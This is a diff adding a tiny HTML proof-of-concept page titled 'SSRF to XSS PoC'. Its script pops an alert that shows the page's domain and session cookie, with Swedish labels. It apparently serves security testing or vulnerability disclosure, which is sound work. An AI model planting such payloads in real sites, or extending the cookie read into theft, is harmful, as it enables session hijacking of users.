@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+    <html>
+    <body>
+        <h1>SSRF to XSS PoC</h1>
+        <script>
+            alert("XSS!\nDomän: " + document.domain + "\nSession Cookie: " + (document.cookie || "Ingen (HttpOnly?)"));
+        </script>
+    </body>
+    </html>
